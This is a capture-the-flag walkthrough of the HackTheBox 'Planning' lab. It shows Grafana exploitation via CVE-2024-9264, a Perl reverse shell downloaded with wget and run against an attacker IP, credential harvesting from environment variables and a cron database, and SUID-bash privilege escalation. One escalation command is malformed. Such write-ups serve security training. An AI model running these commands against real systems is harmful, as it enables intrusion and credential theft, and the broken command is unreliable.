to resolve use the following credentials for the account:  admin / 0D5oT70Fq13EvB5r

___
___
# **Recommendations Before Exploiting the Planning Machine**

Before attempting to exploit the Planning machine, it is important to understand the following concepts and tools:
- **[[gobuster]] usage:** Learn how to use Gobuster to enumerate directories, files, and virtual hosts.
- **Importance of SecLists:** Understand the value of using SecLists for wordlists and payloads in enumeration.
- **Understanding CVEs:** Know how Common Vulnerabilities and Exposures (CVEs) work, and how to check if a service or application is vulnerable.
- **Using `linpeas.sh`:** Familiarize yourself with LinPEAS for privilege escalation enumeration and environment analysis.
- **Crontab-UI:** Understand what crontab-ui is, how it manages cron jobs, and why it might store sensitive information.
- **Files in `/opt/`:** Be aware of what sensitive data might be stored in system directories like `/opt/` or `/root/`.
- **Port forwarding via SSH:** Know how to redirect local ports to remote services using `ssh -L`, to access services only available on localhost.
- **Privilege escalation techniques:** Understand different methods to escalate privileges after gaining access, including using SUID binaries or misconfigured scripts.
  
 Additional recommendations before exploitation:

- **Review open ports and services:** Use `nmap` to enumerate running services and their versions.
- **Check default credentials:** Many web services may have default or weak passwords.
- **Inspect files safely:** Always check configuration or backup files that may contain passwords or secrets.
- **Understand job schedules:** If cron jobs are exposed (e.g., via crontab-ui), review their commands before attempting to run or modify them.
- **Validate network configuration:** Ensure you understand subdomains, virtual hosts, and local-only services before connecting
___
___

# **First Flag**

### RECON
- `nmap -sV 10.10.11.68` → discovered open services (22, 80).
![[Pasted image 20250823144441.png]]
- Visited `http://planning.htb/`.
![[Pasted image 20250823165600.png]]
- Added `planning.htb` to `/etc/hosts`.
```
  sudo nano /etc/hosts
  10.10.11.68   planning.htb		
```

![[Pasted image 20250823170055.png]]

### ENUMERATION
- Used `gobuster vhost` → found subdomain `grafana.planning.htb`.
```
sudo gobuster vhost -u http://planning.htb -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 50
```

![[Pasted image 20250823171840.png]]

- Added `grafana.planning.htb` to `/etc/hosts`.
```
sudo cat  /etc/hosts
10.10.11.68   grafana.planning.htb
```

![[Pasted image 20250823172944.png]]

- Logged into Grafana with `admin:0D5oT70Fq13EvB5r`.
![[Pasted image 20250823173137.png]]


### VULNERABILITY IDENTIFICATION
- Check the Grafana version to evaluate potential vulnerabilities and apply the correct CVE.
![[Pasted image 20250823173519.png]]

- Found authenticated RCE → **CVE-2024-9264**. CVE identified is an authenticated RCE, and the following GitHub repository contains a very easy-to-use PoC : [https://github.com/nollium/CVE-2024-9264](https://github.com/nollium/CVE-2024-9264)
![[Pasted image 20250823175116.png]]

### EXPLOITATION (INITIAL ACCESS)
- Created Python virtual environment, installed dependencies.
```
python3 -m venv venv -> create virtual environment 
source venv/bin/activate -> activate virtual environtment
pip install -r requirements.txt -> install dependecies
```
 
 - Ran PoC into virtual environment :
```
python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb
```

![[Pasted image 20250823180217.png]]

- Wrote Perl reverse shell script (`reverse_shell.pl`).

```
nano reverse_shell.pl

#!/usr/bin/perl
use Socket;
my $ip = '10.10.14.197';       # reemplaza con tu IP de Kali
my $port = 4444;        # puerto donde escucharás
socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if(connect(S, sockaddr_in($port, inet_aton($ip)))) {
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/sh -i");
};
```

- Hosted file with `python3 -m http.server 8000` (Run it in the same directory).
```
python3 -m http.server 8000
```
![[Pasted image 20250823201144.png]]

- Downloaded shell on victim using PoC (wget).
```
python CVE-2024-9264/CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'wget http://10.10.14.197:8000/reverse_shell.pl' http://grafana.planning.htb
```

![[Pasted image 20250823200949.png]]

```
python CVE-2024-9264/CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'ls' http://grafana.planning.htb
```

![[Pasted image 20250823201645.png]]

- Executed shell with `perl reverse_shell.pl`.
```
python CVE-2024-9264/CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'perl reverse_shell.pl' http://grafana.planning.htb
```


- Caught reverse shell with `nc -nvlp 4444`.
```
nc -nvlp 4444
```

![[Pasted image 20250823202245.png]]

### POST-EXPLOITATION (PRIVILEGE ESCALATION ENUM)
- Uploaded and executed `linpeas.sh` on the container.
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

```
wget http://10.10.14.197:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

![[Pasted image 20250823203456.png]]

- Found credentials in environment variables:
```
/tmp/linpeas.sh
```

![[Pasted image 20250823203904.png]]
user: enzo
password: RioTecRANDEntANT!

### USER FLAG
- Reused credentials over SSH:
```
ssh enzo@10.10.11.68 -p 22
```

![[Pasted image 20250823204258.png]]

- Read `user.txt` → obtained first flag 
```
cat user.txt
```
![[Pasted image 20250823204819.png]]

__________________
___

## **Second Flag**
### ENUMERATION

- Review `/opt/crontabs/` directory:
```
cd /opt/crontabs/
ls -la
```

![[Pasted image 20250824154633.png]]

- Transfer `crontab.db` to local machine:
  user: enzo
  password: scp enzo@10.10.11.68:/opt/crontabs/crontab.db .
```
scp enzo@10.10.11.68:/opt/crontabs/crontab.db .
```

![[Pasted image 20250824161006.png]]

- Review and analyze `crontab.db`:
```
cat crontab.db
```

![[Pasted image 20250824162029.png]]
Observed that the password stored for backup jobs is:  P4ssw0rdS0pRi0T3c 

### ACCESSING CRONTAB-UI

- Redirect the victim's port to your local machine
```
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb

```

![[Pasted image 20250824171223.png]]

- Open Crontab-UI in your browser
```
http://127.0.0.1:8000
```

- Try the following username/password combinations:

| User  | Password          |
| ----- | ----------------- |
| admin | P4ssw0rdS0pRi0T3c |
| root  | P4ssw0rdS0pRi0T3c |
| admin | admin             |
| root  | root              |
| admin | password          |
![[Pasted image 20250824180406.png]]

### PRIVILEGE ESCALATION VIA CRONTAB JOB
- Create a new cron job with the following command
```
cp /bin/bash && chmod u+s /tmp/bash
```

![[Pasted image 20250824180946.png]]

- Successfully obtained **root privileges** using the created SUID shell.
```
ls /tmp
/tmp/bash -p
id
```

![[Pasted image 20250824181902.png]]

